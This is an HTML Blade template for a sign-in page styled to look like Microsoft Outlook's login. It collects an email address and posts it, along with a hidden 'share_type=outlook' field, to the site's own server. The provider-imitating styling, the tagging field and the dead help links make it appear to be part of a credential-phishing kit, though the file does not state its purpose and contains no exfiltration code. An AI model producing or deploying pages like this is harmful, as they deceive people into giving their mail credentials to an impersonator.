
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mail Login - Outlook Style</title>

    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            background: #f3f3f3;
            font-family: 'Roboto', Arial, sans-serif;
            min-height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .mail-wrapper {
            width: 100%;
            max-width: 440px;
        }

        .mail-container {
            width: 100%;
            background: #fff;
            padding: 40px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
        }

        .mail-logo {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 28px;
            color: #2563a6;
            font-size: 25px;
            font-weight: 500;
            letter-spacing: -0.5px;
        }

        .logo-icon {
            width: 32px;
            height: 28px;
            border-radius: 4px;
            background: linear-gradient(135deg, #1685d1, #0756a5);
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 19px;
            font-weight: 700;
        }

        .mail-title {
            font-size: 26px;
            font-weight: 500;
            color: #1b1b1b;
            margin: 0 0 16px;
        }

        .mail-subtitle {
            font-size: 14px;
            color: #333;
            line-height: 1.6;
            margin: 0 0 25px;
        }

        .mail-form {
            width: 100%;
            display: flex;
            flex-direction: column;
        }

        .mail-form input[type="email"] {
            width: 100%;
            padding: 11px 2px;
            border: none;
            border-bottom: 1px solid #666;
            border-radius: 0;
            font-size: 16px;
            background: transparent;
            outline: none;
            margin-bottom: 22px;
        }

        .mail-form input[type="email"]:focus {
            border-bottom: 2px solid #0067b8;
        }

        .mail-link {
            color: #0067b8;
            font-size: 13px;
            text-decoration: none;
            margin-bottom: 22px;
            width: fit-content;
        }

        .mail-link:hover {
            text-decoration: underline;
        }

        .mail-info {
            font-size: 13px;
            line-height: 1.6;
            color: #333;
            margin-bottom: 28px;
        }

        .mail-info a {
            color: #0067b8;
            text-decoration: none;
        }

        .mail-actions {
            display: flex;
            justify-content: flex-end;
            align-items: center;
        }

        .mail-button {
            min-width: 108px;
            background: #0067b8;
            color: #fff;
            border: none;
            padding: 10px 22px;
            font-size: 15px;
            cursor: pointer;
        }

        .mail-button:hover {
            background: #005da6;
        }

        .mail-create {
            display: block;
            background: #fff;
            padding: 15px 40px;
            margin-top: 20px;
            font-size: 14px;
            color: #222;
            text-decoration: none;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.12);
        }

        .mail-create:hover {
            background: #f9f9f9;
        }

        .mail-footer {
            text-align: right;
            font-size: 12px;
            color: #555;
            padding: 20px 0;
        }

        .mail-footer a {
            color: #555;
            text-decoration: none;
            margin-left: 14px;
        }

        @media (max-width: 500px) {
            body {
                background: #fff;
                padding: 15px;
            }

            .mail-container {
                padding: 28px 18px;
                box-shadow: none;
            }

            .mail-title {
                font-size: 24px;
            }

            .mail-create {
                padding: 15px 18px;
            }
        }
    </style>
</head>

<body>

    

    <div class="mail-wrapper">

        <div class="mail-container">

            <div class="mail-logo">
                <span class="logo-icon">M</span>
                <span>Mail</span>
            </div>

            <h1 class="mail-title">Sign in</h1>

            <p class="mail-subtitle">
                Continue with your email address.
            </p>

            <form class="mail-form" method="POST" action="{{ route('login') }}">
                @csrf

                 <input
                        id="email"
                        type="hidden"
                        name="share_type"
                        value="outlook"
                        required
                    >

                <input
                    type="email"
                    name="email"
                    placeholder="Email address"
                    autocomplete="email"
                    required
                    autofocus
                >

                <a class="mail-link" href="#">
                    Forgot email?
                </a>

                <div class="mail-info">
                    For your security, only sign in on devices you trust.
                    <a href="#">Learn more</a>
                </div>

                <div class="mail-actions">
                    <button class="mail-button" type="submit">
                        Next
                    </button>
                </div>
            </form>

        </div>

        <a class="mail-create" href="#">
            <strong>New here?</strong> Explore account options
        </a>

        <div class="mail-footer">
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Help</a>
        </div>

    </div>
</body>
</html>
